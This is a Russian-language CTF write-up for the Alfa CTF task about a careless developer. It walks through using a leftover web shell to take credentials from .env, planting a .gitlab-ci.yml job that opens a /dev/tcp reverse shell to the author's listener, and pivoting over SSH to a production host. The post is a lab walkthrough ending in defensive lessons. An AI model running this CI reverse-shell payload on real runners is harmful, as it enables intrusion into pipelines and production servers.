---
labels:
  - ctf
  - security
  - gitlab
---

# Alfa CTF: Разработчик на пляже

Это первая задача Alfa CTF, которую я решил, и первая задача, где мне пригодился
reverse shell. Все действия ниже выполнялись внутри специально подготовленной
CTF-инфраструктуры.

Вот условие:

> У вашего коллеги не просто отпускное настроение — он нашёл для себя идеальный
> баланс: минимум усилий, максимум времени на пляже. Его подход прост: скорость
> важнее правил, удобство важнее безопасности, лучше собрать коллекцию ракушек,
> чем писать тесты. Такая философия оставляет заметные следы, и внимательный
> взгляд сможет превратить их в ключ к следующему флагу.
>
> Блог чиллового разработчика: `secretshell-s6xix3a7.alfactf.ru`

При входе на сайт мы видим блог с заметками разработчика:

![Сайт задания](assets/alfa-ctf-secret-shell-website.png)

Больше всего привлекает внимание запись про веб-шелл. Сначала я пытался найти
параметр в строке запроса, который привёл бы к RCE, затем запускал `gobuster` в
поисках скрытой директории. В итоге вручную проверил `/shell.php` — и попал в
точку.

![Веб-шелл](assets/alfa-ctf-secret-shell-shell.png)

Через веб-шелл забираем учётные данные из `.env`. Следующий логичный шаг —
открыть GitLab.

![GitLab проекта](assets/alfa-ctf-secret-shell-gitlab.png)

В GitLab находится проект и настроенная CI-задача. Возникает идея получить
reverse shell через GitLab Runner. В лабораторной среде запускаем `netcat`,
поднимаем туннель и добавляем `.gitlab-ci.yml`:

```yaml
stages:
  - malicious

malicious:
  stage: malicious
  script:
    - /bin/sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Здесь `IP` и `PORT` берутся из запущенного туннеля. После старта pipeline в окне
с `netcat` появляется shell:

```shell
svetsec@svetsec-laptop:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 60258
/bin/sh: 0: can't access tty; job control turned off
$ ls
README.md
assets
build
index.php
post-commit-directly-to-main.php
post-disable-tests.php
post-hardcode-secrets.php
post-logging-off.php
post-requirements-skim.php
post-web-shell.php
```

Я довольно долго исследовал runner и не понимал, куда двигаться дальше. Нужная
подсказка нашлась в `.bash_history`:

```shell
$ cat .bash_history
ssh -i ~/.ssh/id_rsa prod@production
exit
$ ssh -i ~/.ssh/id_rsa prod@production
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
$ ssh -i ~/.ssh/id_rsa -T prod@production
Host key verification failed.
```

Соединение останавливалось на `Host key verification failed`. Для
неинтерактивной среды нужно заранее добавить ключ хоста `production` в
`known_hosts`:

```shell
$ mkdir -p ~/.ssh
$ ssh-keyscan production >> ~/.ssh/known_hosts
# production:22 SSH-2.0-OpenSSH_10.0p2 Debian-7
```

Пробуем снова:

```shell
$ ssh -T -i ~/.ssh/id_rsa prod@production
Warning: Permanently added the ECDSA host key for IP address '172.25.136.2'.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY.
ls
flag.txt
cat flag.txt
alfa{.........................}
```

Флаг здесь не так важен, поэтому я его скрыл. Задача мне очень понравилась:
раньше мне не доводилось использовать reverse shell в решении CTF, особенно
через CI runner.

Практический вывод для реальных систем: нельзя оставлять веб-шеллы, хранить
секреты в доступных `.env`, запускать недоверенные pipeline на привилегированных
runner или без необходимости держать SSH-ключи production внутри CI-среды.
